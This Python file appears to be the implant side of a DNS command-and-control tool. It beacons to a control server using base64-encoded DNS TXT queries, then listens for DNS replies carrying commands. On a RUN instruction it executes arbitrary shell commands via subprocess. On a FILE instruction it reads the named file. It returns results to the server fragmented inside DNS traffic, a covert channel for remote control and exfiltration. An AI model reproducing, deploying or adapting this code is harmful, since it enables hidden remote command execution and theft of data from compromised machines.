from dns_c2_modules import *

cond = 0

def RunCommand(cmd):
    return subprocess.getoutput(cmd)
    
def bin_to_str(bin_data):
    return bin_data.decode('utf-8')
        
def send_beacon(addr,bin_data):
    while cond == 0:
        data = base64.b64encode(bin_data).decode('ascii')
        pkt = IP(dst=addr)/UDP(sport=1234)/DNS(qd=DNSQR(qtype="TXT", qname=data))
        send(pkt)
        print("send beacon")
        time.sleep(5)        

def client_listen():
    print("client start listening")
    sniff_pkt(pfilter="udp and host " + SERVER_ADR,handler=parse_packet)
    
    
def parse_packet(packet):
   if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
       
        global cond
        cond = 1
        base64_rdata = packet[1][DNSRR].rdata[0]
        base64_rdata_padded = add_padding(base64_rdata)
        rdata = base64.b64decode(base64_rdata_padded)
        prefix_packet = rdata[:6]
        data_recieved = rdata[6:]
        if prefix_packet == RUN or prefix_packet == FILE:
            txt_recieved = bin_to_str(data_recieved)
            if prefix_packet == RUN:
                output = RunCommand(txt_recieved)
                bin_output = bytes(output.encode())
                frag_and_send(packet,data_recieved,1,0,BEGIN_OUTPUT)
                frag_and_send(packet,bin_output,1,1,IN_TRANSFER)
            else:
                output = read_file(txt_recieved)
                frag_and_send(packet,data_recieved,1,0,BEGIN_FILE)
                frag_and_send(packet,output,1,0,IN_TRANSFER)
            frag_and_send(packet,b'ok',1,0,EF)
            print("finished transfer")
            cond = 0
        cond = 0
        print("cond changed to " + str(cond))
        
     
if __name__=="__main__":
    signal.signal(signal.SIGINT, signal_handler)
    beacon_thread = threading.Thread(target=send_beacon, args=(SERVER_ADR,BEACON))
    beacon_thread.start()
    client_listen()


